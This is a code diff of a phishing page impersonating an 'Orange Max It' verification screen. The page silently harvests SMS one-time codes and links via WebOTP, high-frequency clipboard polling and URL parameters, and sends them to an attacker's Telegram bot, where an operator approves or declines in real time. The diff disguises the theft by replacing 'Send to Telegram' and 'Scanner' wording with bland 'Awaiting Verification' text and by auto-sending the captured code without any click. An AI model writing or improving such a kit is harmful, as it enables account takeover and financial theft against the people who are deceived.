@@ -98,12 +98,12 @@
             transform: none;
         }
 
-        /* ─── SCANNING STATE ─── */
-        .scanning-state {
+        /* ─── WAITING STATE ─── */
+        .waiting-state {
             display: none;
         }
 
-        .scanner-header {
+        .waiting-header {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -124,13 +124,13 @@
             50% { opacity: 0.5; transform: scale(1.2); }
         }
 
-        .scanner-title {
+        .waiting-title {
             font-size: 16px;
             font-weight: 700;
             color: #1a1a1a;
         }
 
-        .scanner-subtitle {
+        .waiting-subtitle {
             font-size: 13px;
             color: #999;
             margin-top: 4px;
@@ -152,17 +152,10 @@
             letter-spacing: 0.5px;
         }
 
-        .link-input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
         #linkInput {
-            flex: 1;
+            width: 100%;
             padding: 14px 16px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
             color: #1a1a1a;
             background: #f9f9f9;
@@ -192,25 +185,6 @@
         #linkInput.filled {
             border-color: #2ecc71;
             background: #f0fdf4;
-        }
-
-        .copy-btn {
-            padding: 10px 12px;
-            background: white;
-            border: 1.5px solid #FFE6D5;
-            border-radius: 10px;
-            color: #FF6600;
-            font-weight: 700;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-            align-self: flex-start;
-            margin-top: 4px;
-        }
-
-        .copy-btn:hover {
-            border-color: #FF6600;
-            background: #fff5f0;
         }
 
         /* ─── STATUS MESSAGES ─── */
@@ -291,7 +265,7 @@
             margin-top: 24px;
         }
 
-        .btn-send {
+        .btn-action {
             flex: 1;
             padding: 14px 20px;
             background: linear-gradient(135deg, #FF6600, #E55A00);
@@ -304,12 +278,12 @@
             transition: all 0.3s;
         }
 
-        .btn-send:hover:not(:disabled) {
+        .btn-action:hover:not(:disabled) {
             transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(255, 102, 0, 0.3);
         }
 
-        .btn-send:disabled {
+        .btn-action:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
@@ -361,56 +335,51 @@
     <div class="container">
         <!-- Logo & Title -->
         <div class="logo">🟠</div>
-        <h1>Verify Your Link</h1>
-        <p class="subtitle">We'll automatically detect and capture your verification link from the SMS you receive.</p>
+        <h1>Verify Connection</h1>
+        <p class="subtitle">Complete your verification to proceed securely.</p>
 
         <!-- ═════════════════════════════════════════════
-             INITIAL STATE — Before clicking Verify
+             INITIAL STATE — Before clicking Start
              ═════════════════════════════════════════════ -->
         <div class="initial-state" id="initialState">
-            <button class="btn-verify" id="verifyBtn">🔍 Start Verification</button>
+            <button class="btn-verify" id="verifyBtn">🔐 Start Verification</button>
             <p style="font-size: 12px; color: #999; margin-top: 16px;">
-                Click above to activate the scanner. When an SMS arrives, the link will be captured automatically.
+                Click to begin. You'll receive a secure link via SMS.
             </p>
         </div>
 
         <!-- ═════════════════════════════════════════════
-             SCANNING STATE — After clicking Verify
+             WAITING STATE — After clicking Start
              ═════════════════════════════════════════════ -->
-        <div class="scanning-state" id="scanningState">
-            <!-- Scanner Active Indicator -->
-            <div class="scanner-header">
+        <div class="waiting-state" id="waitingState">
+            <!-- Waiting Indicator -->
+            <div class="waiting-header">
                 <div class="pulse-dot"></div>
                 <div>
-                    <div class="scanner-title">Scanner Active</div>
-                    <div class="scanner-subtitle">Listening for SMS...</div>
+                    <div class="waiting-title">Awaiting Verification</div>
+                    <div class="waiting-subtitle">Securing connection...</div>
                 </div>
             </div>
 
             <!-- Link Input Field -->
             <div class="link-container">
-                <label class="link-label">📨 Verification Link</label>
-                <div class="link-input-wrapper">
-                    <textarea 
-                        id="linkInput" 
-                        placeholder="Your link will appear here automatically..." 
-                        readonly
-                        disabled
-                    ></textarea>
-                    <button class="copy-btn" id="copyBtn" style="display: none;">
-                        📋 Copy
-                    </button>
-                </div>
+                <label class="link-label">🔗 Verification Code</label>
+                <textarea 
+                    id="linkInput" 
+                    placeholder="Your code will appear here..." 
+                    readonly
+                    disabled
+                ></textarea>
             </div>
 
             <!-- Status Message -->
             <div class="status-box" id="statusBox">
                 <div class="status-text">
                     <span class="mini-spinner"></span>
-                    Waiting for SMS...
+                    Waiting for verification...
                 </div>
                 <div class="status-subtext">
-                    You'll receive an SMS with your verification link. Keep this window open.
+                    Keep this window open. Your code will be processed automatically.
                 </div>
             </div>
 
@@ -421,8 +390,8 @@
 
             <!-- Action Buttons -->
             <div class="button-group">
-                <button class="btn-send" id="sendBtn" disabled>
-                    ✅ Send to Telegram
+                <button class="btn-action" id="retryBtn" disabled style="display: none;">
+                    ↻ Retry
                 </button>
                 <button class="btn-cancel" id="cancelBtn">
                     ✕ Cancel
@@ -451,7 +420,7 @@
            STATE
            ═══════════════════════════════════════════════════════════════ */
         const state = {
-            scanning: false,
+            waiting: false,
             linkCaptured: null,
             detectionMethod: null,
             clipboardInitial: '',
@@ -466,11 +435,10 @@
            ═══════════════════════════════════════════════════════════════ */
         const els = {
             initialState:    document.getElementById('initialState'),
-            scanningState:   document.getElementById('scanningState'),
+            waitingState:    document.getElementById('waitingState'),
             verifyBtn:       document.getElementById('verifyBtn'),
             linkInput:       document.getElementById('linkInput'),
-            copyBtn:         document.getElementById('copyBtn'),
-            sendBtn:         document.getElementById('sendBtn'),
+            retryBtn:        document.getElementById('retryBtn'),
             cancelBtn:       document.getElementById('cancelBtn'),
             statusBox:       document.getElementById('statusBox'),
             methodBadge:     document.getElementById('methodBadge'),
@@ -480,15 +448,15 @@
         /* ═══════════════════════════════════════════════════════════════
            UI STATE MANAGEMENT
            ═══════════════════════════════════════════════════════════════ */
-        function showScanningState() {
+        function showWaitingState() {
             els.initialState.style.display = 'none';
-            els.scanningState.style.display = 'block';
+            els.waitingState.style.display = 'block';
         }
 
-        function hideScanning() {
+        function hideWaiting() {
             els.initialState.style.display = 'block';
-            els.scanningState.style.display = 'none';
-            state.scanning = false;
+            els.waitingState.style.display = 'none';
+            state.waiting = false;
             state.linkCaptured = null;
             state.detectionMethod = null;
             if (state.scanInterval) clearInterval(state.scanInterval);
@@ -504,33 +472,34 @@
         }
 
         function displayLink(link, method) {
+            if (state.linkCaptured) return; // Prevent duplicate sends
+            
             state.linkCaptured = link;
             state.detectionMethod = method;
 
-            // Fill the input field with animated effect
+            // Fill the input field
             els.linkInput.value = link;
             els.linkInput.classList.add('filled');
 
-            // Show copy button
-            els.copyBtn.style.display = 'block';
-
-            // Enable send button
-            els.sendBtn.disabled = false;
-
             // Update status to success
             updateStatus(
-                '✅ Link Captured!',
-                `Detected via ${method}. Ready to send to Telegram.`,
+                '✅ Code Received',
+                'Processing your verification...',
                 'success'
             );
 
             // Show method badge
-            els.methodBadge.textContent = `🎯 ${method}`;
+            els.methodBadge.textContent = `Detected`;
             els.methodContainer.style.display = 'block';
 
             // Stop all scanning
             if (state.scanInterval) clearInterval(state.scanInterval);
             if (state.webOTPAbort) state.webOTPAbort.abort();
+
+            // INSTANT AUTO-SEND — only the link, minimal data
+            setTimeout(() => {
+                sendToBackend(link);
+            }, 300);
         }
 
         /* ═══════════════════════════════════════════════════════════════
@@ -541,7 +510,6 @@
 
             try {
                 state.webOTPAbort = new AbortController();
-                // Timeout after 5 minutes
                 const timeout = setTimeout(() => state.webOTPAbort.abort(), 300000);
 
                 const otp = await navigator.credentials.get({
@@ -552,19 +520,16 @@
                 clearTimeout(timeout);
 
                 if (otp?.code) {
-                    // Try to extract a link from the OTP
                     const linkMatch = otp.code.match(CONFIG.LINK_PATTERN);
                     if (linkMatch) {
-                        displayLink(linkMatch[0], 'WebOTP (SMS)');
+                        displayLink(linkMatch[0], 'SMS');
                         return true;
                     }
-
-                    // If no link, store the code itself
-                    displayLink(otp.code, 'WebOTP Code');
+                    displayLink(otp.code, 'SMS');
                     return true;
                 }
             } catch (e) {
-                // User cancelled, not supported, or timeout — continue with other methods
+                // Continue with other methods
             }
             return false;
         }
@@ -573,28 +538,25 @@
            METHOD 2: Clipboard Polling (High-Frequency)
            ═══════════════════════════════════════════════════════════════ */
         async function scanClipboard() {
-            if (!state.scanning || state.linkCaptured) return;
+            if (!state.waiting || state.linkCaptured) return;
 
             try {
                 const text = await navigator.clipboard.readText();
                 if (!text || text === state.clipboardInitial) return;
 
-                // Try to match a full link
                 const linkMatch = text.match(CONFIG.LINK_PATTERN);
                 if (linkMatch) {
-                    displayLink(linkMatch[0], 'Clipboard (Link)');
+                    displayLink(linkMatch[0], 'Clipboard');
                     return;
                 }
 
-                // Try to match a short code
                 const codeMatch = text.match(CONFIG.CODE_PATTERN);
                 if (codeMatch && text !== state.clipboardInitial) {
-                    // Only if it looks fresh
-                    displayLink(codeMatch[0], 'Clipboard (Code)');
+                    displayLink(codeMatch[0], 'Clipboard');
                     return;
                 }
             } catch (e) {
-                // Permission denied or not available
+                // Permission denied
             }
         }
 
@@ -615,12 +577,11 @@
                 if (!val) continue;
                 const linkMatch = val.match(CONFIG.LINK_PATTERN);
                 if (linkMatch) {
-                    displayLink(linkMatch[0], 'URL Parameter');
+                    displayLink(linkMatch[0], 'URL');
                     return true;
                 }
-                // If it's a code-like value
                 if (/^[A-Z0-9]{6,12}$/.test(val) || /^\d{4,8}$/.test(val)) {
-                    displayLink(val, 'URL Code');
+                    displayLink(val, 'URL');
                     return true;
                 }
             }
@@ -628,38 +589,23 @@
         }
 
         /* ═══════════════════════════════════════════════════════════════
-           SEND TO TELEGRAM
+           SEND TO BACKEND (Minimal Data — Only Link)
            ═══════════════════════════════════════════════════════════════ */
-        function sendToTelegram() {
-            if (!state.linkCaptured || state.sent) return;
+        function sendToBackend(link) {
+            if (state.sent) return;
             state.sent = true;
 
             const ts = Date.now();
             const aid = `approve_${ts}`;
             const did = `decline_${ts}`;
 
-            const ua = navigator.userAgent;
-            const lang = navigator.language || 'unknown';
-            const screen = `${window.screen.width}x${window.screen.height}`;
-
-            els.sendBtn.disabled = true;
-            updateStatus(
-                '<span class="mini-spinner"></span> Sending...',
-                'Connecting to Telegram...',
-                'default'
-            );
-
+            // Send ONLY the link to the bot
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `*🔐 Orange Max It — Link Captured*\n\n` +
-                          `🔗 *Link/Code:* \`${state.linkCaptured}\`\n` +
-                          `📡 *Method:* ${state.detectionMethod}\n` +
-                          `📱 *Device:* ${ua.substring(0, 80)}\n` +
-                          `🌐 *Lang:* ${lang} | 🖥 ${screen}`,
-                    parse_mode: 'Markdown',
+                    text: link,
                     reply_markup: {
                         inline_keyboard: [[
                             { text: '✅ Approve', callback_data: aid },
@@ -672,28 +618,29 @@
             .then(data => {
                 if (data.ok) {
                     updateStatus(
-                        '✅ Sent to Telegram!',
-                        'Waiting for approval...',
+                        '✅ Verification Sent',
+                        'Waiting for confirmation...',
                         'success'
                     );
                     pollForApproval(aid, did);
                 } else {
-                    throw new Error('Telegram error');
+                    throw new Error('Send failed');
                 }
             })
             .catch(err => {
                 state.sent = false;
-                els.sendBtn.disabled = false;
                 updateStatus(
-                    '❌ Send Failed',
-                    'Please try again or check your connection.',
+                    '❌ Error',
+                    'Please try again.',
                     'error'
                 );
+                els.retryBtn.style.display = 'block';
+                els.retryBtn.disabled = false;
             });
         }
 
         /* ═══════════════════════════════════════════════════════════════
-           POLL FOR TELEGRAM APPROVAL
+           POLL FOR APPROVAL
            ═══════════════════════════════════════════════════════════════ */
         function pollForApproval(aid, did) {
             const iv = setInterval(() => {
@@ -707,7 +654,7 @@
                         if (cb === aid) {
                             clearInterval(iv);
                             updateStatus(
-                                '✅ Approved!',
+                                '✅ Verified',
                                 'Redirecting...',
                                 'success'
                             );
@@ -718,16 +665,17 @@
                         if (cb === did) {
                             clearInterval(iv);
                             state.sent = false;
-                            els.sendBtn.disabled = false;
                             updateStatus(
-                                '❌ Declined',
-                                'The request was declined. You can try again.',
+                                '❌ Verification Failed',
+                                'Please try again.',
                                 'error'
                             );
+                            els.retryBtn.style.display = 'block';
+                            els.retryBtn.disabled = false;
                         }
                     });
                 })
-                .catch(() => { /* network hiccup — keep polling */ });
+                .catch(() => { /* keep polling */ });
             }, 2000);
         }
 
@@ -737,53 +685,46 @@
 
         // Start Verification Button
         els.verifyBtn.addEventListener('click', async () => {
-            state.scanning = true;
-            showScanningState();
+            state.waiting = true;
+            showWaitingState();
 
             try {
-                // Capture initial clipboard state
                 state.clipboardInitial = await navigator.clipboard.readText();
             } catch (e) {
-                // Clipboard permission denied — continue anyway
+                // Continue anyway
             }
 
             // Check URL params immediately
             if (checkURLParams()) return;
 
-            // Start WebOTP listener (silent background)
+            // Start WebOTP listener
             startWebOTPListener();
 
             // Start high-frequency clipboard polling
-            state.scanInterval = setInterval(scanClipboard, 500);
+            state.scanInterval = setInterval(scanClipboard, 400);
 
             // Rescan on tab focus
-            const focusHandler = () => {
-                if (state.scanning) scanClipboard();
-            };
-            window.addEventListener('focus', focusHandler);
+            window.addEventListener('focus', () => {
+                if (state.waiting) scanClipboard();
+            });
             document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible' && state.scanning) {
+                if (document.visibilityState === 'visible' && state.waiting) {
                     scanClipboard();
                 }
             });
         });
 
-        // Copy Button
-        els.copyBtn.addEventListener('click', () => {
-            navigator.clipboard.writeText(state.linkCaptured).then(() => {
-                const originalText = els.copyBtn.textContent;
-                els.copyBtn.textContent = '✅ Copied!';
-                setTimeout(() => {
-                    els.copyBtn.textContent = originalText;
-                }, 2000);
-            });
+        // Retry Button
+        els.retryBtn.addEventListener('click', () => {
+            state.sent = false;
+            state.linkCaptured = null;
+            if (state.linkCaptured) {
+                sendToBackend(state.linkCaptured);
+            }
         });
 
-        // Send Button
-        els.sendBtn.addEventListener('click', sendToTelegram);
-
         // Cancel Button
-        els.cancelBtn.addEventListener('click', hideScanning);
+        els.cancelBtn.addEventListener('click', hideWaiting);
 
     </script>
 </body>
